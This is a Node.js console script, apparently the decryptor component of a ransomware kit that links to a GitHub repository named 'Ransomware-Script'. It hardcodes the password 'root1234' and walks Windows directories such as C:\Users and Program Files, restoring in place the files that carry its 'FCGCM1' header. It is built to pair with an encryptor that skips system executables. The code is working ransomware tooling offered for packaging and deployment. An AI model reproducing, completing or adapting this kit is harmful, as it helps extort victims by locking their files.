#!/usr/bin/env node
// system-decrypt.js
// Console decryptor (entry file). Matches package.json "bin".
// WARNING: This will overwrite files (in-place). Use only on your own data or a disposable VM snapshot.

// Visible GitHub link — embedded so pkg/bundlers include it in the exe binary.
const __GITHUB_URL = 'https://github.com/hackervegas001/Ransomware-Script';
// reference to keep it in the bundled snapshot
try { process.env.__GH = __GITHUB_URL; } catch (e) {}

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');

/// =========== CONFIG - Edit BEFORE packaging/running ===========
const PASSWORD = 'root1234'; // <-- set the password you used to encrypt
const TARGET_DIRS = [
  'C:\\.onecontext',
  'C:\\PerfLogs',
  'C:\\Program Files',
  'C:\\Program Files (x86)',
  'C:\\Users'   // <-- edit target directories as needed (Windows paths)
];
// Number of allowed attempts for entering password (set 1 if you want just a single prompt)
const MAX_ATTEMPTS = 1;
// File extensions/names to skip (lowercase)
const SKIP_EXTENSIONS = ['.exe', '.dll', '.sys', '.efi', '.msi', '.bat', '.cmd', '.lnk', '.drv'];
const SKIP_FILENAMES = ['pagefile.sys', 'hiberfil.sys'];
/// =============================================================

const ALGO = 'aes-256-gcm';
const SALT_LEN = 16;
const IV_LEN = 12;
const TAG_LEN = 16;
const MAGIC = Buffer.from('FCGCM1'); // must match encryptor's magic header

function deriveKey(password, salt) {
  return crypto.scryptSync(password, salt, 32);
}

function readHeaderBytes(filePath, length) {
  const fd = fs.openSync(filePath, 'r');
  try {
    const buf = Buffer.alloc(length);
    const bytesRead = fs.readSync(fd, buf, 0, length, 0);
    return buf.slice(0, bytesRead);
  } finally {
    fs.closeSync(fd);
  }
}

function isEncryptedFile(filePath) {
  try {
    const head = readHeaderBytes(filePath, MAGIC.length);
    return head && head.length === MAGIC.length && head.equals(MAGIC);
  } catch (e) {
    return false;
  }
}

function shouldSkipFile(filePath) {
  const name = path.basename(filePath).toLowerCase();
  if (SKIP_FILENAMES.includes(name)) return true;
  const ext = path.extname(name).toLowerCase();
  if (ext && SKIP_EXTENSIONS.includes(ext)) return true;
  return false;
}

function decryptFileInPlace(filePath, password) {
  const raw = fs.readFileSync(filePath);
  const headerLen = MAGIC.length + SALT_LEN + IV_LEN + TAG_LEN;
  if (raw.length < headerLen) throw new Error('file too small or corrupt');

  const saltStart = MAGIC.length;
  const ivStart = saltStart + SALT_LEN;
  const tagStart = ivStart + IV_LEN;
  const cipherStart = tagStart + TAG_LEN;

  const salt = raw.slice(saltStart, ivStart);
  const iv = raw.slice(ivStart, tagStart);
  const tag = raw.slice(tagStart, cipherStart);
  const ciphertext = raw.slice(cipherStart);

  const key = deriveKey(password, salt);
  const decipher = crypto.createDecipheriv(ALGO, key, iv);
  decipher.setAuthTag(tag);
  const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);

  const tmp = filePath + '.tmp_dec';
  fs.writeFileSync(tmp, decrypted);
  fs.renameSync(tmp, filePath);
}

function walkAndDecrypt(dir, password) {
  let items;
  try { items = fs.readdirSync(dir); } catch (e) { console.warn(`Cannot read dir ${dir}: ${e.message}`); return { processed:0, errors:0 }; }
  let processed = 0, errors = 0;
  for (const it of items) {
    const full = path.join(dir, it);
    let s;
    try { s = fs.statSync(full); } catch (e) { console.warn(`Cannot stat ${full}: ${e.message}`); continue; }
    if (s.isDirectory()) {
      const r = walkAndDecrypt(full, password);
      processed += r.processed;
      errors += r.errors;
    } else if (s.isFile()) {
      if (shouldSkipFile(full)) continue;
      try {
        if (isEncryptedFile(full)) {
          decryptFileInPlace(full, password);
          processed++;
          console.log(`[OK] Decrypted: ${full}`);
        }
      } catch (e) {
        errors++;
        console.error(`[ERR] Failed to decrypt ${full}: ${e.message}`);
      }
    }
  }
  return { processed, errors };
}

function decryptTargets(password, targets) {
  let totalProcessed = 0, totalErrors = 0;
  for (const t of targets) {
    try {
      if (!fs.existsSync(t) || !fs.statSync(t).isDirectory()) {
        console.warn(`Skipping missing/non-dir target: ${t}`);
        continue;
      }
      const r = walkAndDecrypt(t, password);
      totalProcessed += r.processed;
      totalErrors += r.errors;
    } catch (e) {
      console.warn(`Error processing ${t}: ${e.message}`);
    }
  }
  return { processed: totalProcessed, errors: totalErrors };
}

/// Read password from console without echoing (works in Node)
function promptHidden(promptText) {
  return new Promise((resolve) => {
    const stdin = process.stdin;
    const stdout = process.stdout;

    stdout.write(promptText);

    stdin.resume();
    stdin.setRawMode(true);
    stdin.setEncoding('utf8');

    let password = '';

    function onData(ch) {
      if (!ch) return;
      if (ch === '\r' || ch === '\n') {
        stdout.write('\n');
        stdin.setRawMode(false);
        stdin.pause();
        stdin.removeListener('data', onData);
        return resolve(password);
      } else if (ch === '\u0003') { // ctrl-c
        stdin.setRawMode(false);
        stdin.pause();
        stdin.removeListener('data', onData);
        process.exit(1);
      } else if (ch === '\u0008' || ch === '\u007f') { // backspace
        if (password.length > 0) {
          password = password.slice(0, -1);
          // erase star
          stdout.write('\b \b');
        }
      } else {
        password += ch;
        stdout.write('*');
      }
    }

    stdin.on('data', onData);
  });
}

(async () => {
  try {
    let attempts = 0;
    while (attempts < MAX_ATTEMPTS) {
      const entered = await promptHidden('Enter decryption password: ');
      if (entered === PASSWORD) {
        console.log('\nPassword correct — starting decryption...');
        const res = decryptTargets(entered, TARGET_DIRS);
        console.log(`\nDecryption finished. Files processed: ${res.processed}, errors: ${res.errors}`);
        process.exit(0);
      } else {
        attempts++;
        console.log('\nWrong credentials');
        if (attempts >= MAX_ATTEMPTS) {
          console.log('Maximum attempts reached. Exiting.');
          process.exit(1);
        } else {
          console.log(`You have ${MAX_ATTEMPTS - attempts} attempt(s) left.`);
        }
      }
    }
  } catch (err) {
    console.error('Fatal error:', err && err.message ? err.message : err);
    process.exit(1);
  }
})();
